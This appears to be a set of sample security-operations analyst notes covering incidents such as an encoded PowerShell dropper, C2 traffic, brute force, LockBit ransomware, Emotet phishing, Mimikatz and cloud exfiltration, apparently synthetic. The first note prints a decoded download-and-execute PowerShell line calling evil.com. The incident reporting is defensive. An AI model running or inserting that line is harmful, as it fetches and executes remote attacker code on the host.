content: Initial triage completed. PowerShell execution appears to be encoded command downloading second-stage payload. Base64 decoded to: IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'). Recommending host isolation.
Confirmed C2 communication to 185.220.101.45. VirusTotal shows 45/72 detections. Domain resolves to known APT28 infrastructure. Escalating to Tier 3.
Brute force attack originated from IP 203.0.113.42. Observed 247 failed login attempts over 15 minutes targeting admin accounts. Source IP blocked at firewall.
Ransomware analysis complete. Identified as LockBit 3.0 variant. Encryption started at 14:23:15 UTC. Affected systems isolated. Recovery playbook initiated.
Incident response team activated. Legal and PR teams notified. Backup restoration in progress. Estimated recovery time: 4-6 hours.
Phishing email analysis: Sender spoofed Microsoft domain. Malicious attachment contains Emotet loader. Email quarantined and sender blocked. Scanning for additional instances.
Credential dumping attempt detected on DC01. Mimikatz signature identified. Process terminated and memory dump collected for forensic analysis.
Data exfiltration to cloud storage detected. Approximately 2.3GB transferred to suspicious S3 bucket. User account compromised via phishing. Account disabled and forensic imaging initiated.
